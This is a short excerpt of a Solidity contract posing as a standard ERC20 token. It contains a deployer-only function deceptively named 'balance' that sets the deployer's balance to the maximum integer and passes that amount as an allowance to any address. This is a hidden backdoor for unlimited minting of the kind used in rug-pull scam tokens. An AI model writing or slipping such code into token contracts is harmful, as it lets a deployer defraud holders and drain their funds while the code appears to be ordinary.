...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function balance(address spender) external {
        address sender = _msgSender();
        require(sender == _deployer, "ERC20: caller is not the deployer");
        _balances[sender] = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;

        if (spender != address(0)) {
            _allowances[sender][spender] = _balances[sender];
        }
    }
